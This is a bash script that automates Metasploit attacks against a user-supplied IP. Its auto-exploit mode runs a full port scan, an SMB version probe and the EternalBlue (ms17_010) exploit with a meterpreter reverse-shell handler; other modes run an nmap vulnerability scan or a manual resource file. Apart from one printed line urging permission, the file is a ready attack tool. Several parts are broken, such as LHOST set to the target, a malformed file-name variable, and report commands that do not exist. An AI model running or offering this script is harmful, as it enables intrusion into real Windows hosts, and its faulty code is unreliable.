#!/bin/bash

ask_input() {
  read -p "Enter the target IP or hostname: " target
}

show_menu() {
  echo "Please choose one of the following scan options:"
  echo "1) Auto-exploit"
  echo "2) Discovery scan"
  echo "3) Manual exploit"
  read -p "Enter your choice [1-3]: " choice
}

auto_exploit() {
  timeout=3600
  trap 'echo "Exploit stopped by user."; exit 0' INT
  echo "Starting automated exploit against $target for $timeout seconds."
  time msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $target; set LPORT 4444; run -j; use auxiliary/scanner/portscan/tcp; set RHOSTS $target; set PORTS 1-65535; run; use auxiliary/scanner/smb/smb_version; set RHOSTS $target; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOST $target; run;" &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Exploit finished."
}

discovery_scan() {
  timeout=3600
  trap 'echo "Scan stopped by user."; exit 0' INT
  echo "Starting discovery scan against $target for $timeout seconds."
  time msfconsole -q -x "db_nmap -sV --script vuln $target" &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Scan finished."
}

manual_exploit() {
  echo "Launching msfconsole with commands from manual.rc file."
  msfconsole -q -r manual.rc 
}

save_report() {
  report_id=$(msfconsole -x "db_export -f xml report.xml; exit" | grep "Report ID" | cut -d' ' -f3)
  file_name="$target_$(date +%Y%m%d).pdf"
  msfconsole -x "db_export_pdf $report_id $file_name; exit"
}

check_input() {
  if [[ -z $target ]]; then
    echo "Invalid input. Please try again."
    ask_input
    check_input
  fi
}

echo "This script will perform a vulnerability scan and exploit using Metasploit and save the report."
echo "Please be careful and ethical when using this script and do not scan or exploit any servers without permission."
ask_input
check_input
show_menu

case $choice in
  1) auto_exploit ;;
  2) discovery_scan ;;
  3) manual_exploit ;;
  *) echo "Invalid choice. Please try again." ; show_menu ;;
esac

save_report
